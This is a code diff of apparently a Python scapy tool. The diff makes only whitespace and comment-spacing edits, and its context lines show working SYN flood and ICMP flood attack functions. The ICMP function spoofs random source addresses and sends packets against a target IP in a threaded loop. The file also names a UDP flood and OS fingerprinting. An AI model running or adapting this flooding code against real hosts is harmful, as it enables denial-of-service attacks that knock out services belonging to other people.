@@ -227,7 +227,7 @@ def os_fingerprint(packet):
     return "Unknown OS"
 
 
-#(11) Code to perform syn flood attack
+# (11) Code to perform syn flood attack
 def perform_syn_flood_attack(ip_addr=None, port="139"):
     if not ip_addr:
         # Get input from the user
@@ -241,7 +241,7 @@ def perform_syn_flood_attack(ip_addr=None, port="139"):
     def send_packet():
         while not stop_flag.is_set():
             send(packet, inter=0.005, verbose=0)
-    
+
     # Crea un thread per eseguire l'attacco SYN flood
     attack_thread = threading.Thread(target=send_packet)
     attack_thread.start()
@@ -258,12 +258,12 @@ def perform_syn_flood_attack(ip_addr=None, port="139"):
     return "SYN flood attack performed on " + ip_addr + " to port " + port
 
 
-#(12) Code to perform icmp flood attack
+# (12) Code to perform icmp flood attack
 def perform_icmp_flood_attack(ip_addr=None):
     if not ip_addr:
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
-    
+
     packet = IP(src=RandIP(), dst=ip_addr) / ICMP() / "1234567890"
 
     # Create a flag to indicate whether to stop the attack
@@ -272,7 +272,7 @@ def perform_icmp_flood_attack(ip_addr=None):
     def send_packet():
         while not stop_flag.is_set():
             send(packet, inter=0.005, verbose=0)
-    
+
     # Crea un thread per eseguire l'attacco SYN flood
     attack_thread = threading.Thread(target=send_packet)
     attack_thread.start()
@@ -284,10 +284,9 @@ def perform_icmp_flood_attack(ip_addr=None):
     stop_flag.set()
 
     # Wait for the attack thread to finish
-    attack_thread.join()    
+    attack_thread.join()
 
     return "ICMP flood attack performed on " + ip_addr
-
 
 
 # (13) Code to perform udp flood attack
